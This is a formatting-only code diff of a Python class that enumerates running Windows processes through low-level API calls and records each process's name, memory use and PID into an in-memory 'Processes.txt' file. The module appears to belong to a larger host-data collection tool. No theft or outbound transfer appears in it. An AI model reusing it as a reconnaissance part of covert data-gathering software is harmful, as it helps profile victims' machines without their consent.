@@ -10,39 +10,47 @@ class Processes:
     """
     Collects all running processes.
     """
-    def __init__(self, folder: str):
 
+    def __init__(self, folder: str):
         self.__file = path.join(folder, "Processes.txt")
         self.__storage = MemoryStorage()
 
     @staticmethod
     def get_processes_list() -> List:
-
         process_list = []
         process_ids = (DWORD * 4096)()
         bytes_needed = DWORD()
-        mb = (1024 * 1024)
+        mb = 1024 * 1024
 
-        windll.psapi.EnumProcesses(byref(process_ids), sizeof(process_ids), byref(bytes_needed))
+        windll.psapi.EnumProcesses(
+            byref(process_ids), sizeof(process_ids), byref(bytes_needed)
+        )
 
         for index in range(int(bytes_needed.value / sizeof(DWORD))):
             process_id = process_ids[index]
 
             try:
-
-                process_handle = windll.kernel32.OpenProcess(0x0400 | 0x0010, False, process_id)
+                process_handle = windll.kernel32.OpenProcess(
+                    0x0400 | 0x0010, False, process_id
+                )
                 memory_info = ProcessMemoryCountersEx()
                 memory_info.cb = sizeof(ProcessMemoryCountersEx)
 
-                if windll.psapi.GetProcessMemoryInfo(process_handle, byref(memory_info), sizeof(memory_info)):
+                if windll.psapi.GetProcessMemoryInfo(
+                    process_handle, byref(memory_info), sizeof(memory_info)
+                ):
                     process_name = create_unicode_buffer(512)
-                    windll.psapi.GetModuleFileNameExW(process_handle, 0, process_name, sizeof(process_name))
+                    windll.psapi.GetModuleFileNameExW(
+                        process_handle, 0, process_name, sizeof(process_name)
+                    )
 
-                    process_list.append([
-                        path.basename(process_name.value),
-                        f"{memory_info.WorkingSetSize // mb} MB",
-                        process_id
-                    ])
+                    process_list.append(
+                        [
+                            path.basename(process_name.value),
+                            f"{memory_info.WorkingSetSize // mb} MB",
+                            process_id,
+                        ]
+                    )
 
                 windll.kernel32.CloseHandle(process_handle)
 
@@ -63,7 +71,12 @@ class Processes:
         """
         self.__storage.add_from_memory(
             self.__file,
-            "\n".join(line for line in functions.create_table(["Name", "Memory", "PID"], self.get_processes_list()))
+            "\n".join(
+                line
+                for line in functions.create_table(
+                    ["Name", "Memory", "PID"], self.get_processes_list()
+                )
+            ),
         )
 
     def run(self) -> List:
@@ -77,7 +90,6 @@ class Processes:
         - None.
         """
         try:
-
             self.__get_system_processes()
 
             return self.__storage.get_data()
